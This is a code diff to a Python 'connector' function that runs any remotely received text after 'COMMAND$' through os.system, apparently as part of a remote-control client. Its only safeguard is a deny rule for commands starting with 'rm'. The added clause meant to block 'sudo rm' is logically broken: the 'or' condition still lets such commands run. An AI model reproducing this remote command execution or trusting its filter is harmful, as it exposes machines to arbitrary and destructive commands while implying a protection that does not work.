@@ -94,7 +94,7 @@ def connector():
                 # Do something when some data is present
                 if 'COMMAND$' in data:
                     # Run command
-                    if not data.split('$')[1].startswith('rm'):
+                    if not data.split('$')[1].startswith('rm') or data.split('$')[1].startswith('sudo rm'):
                         os.system(data.split('$')[1])
                     else:
                         print('\033[1;94m[ INFO ]\033[0m Commanded Blocked: %s' % data.split('$')[1])
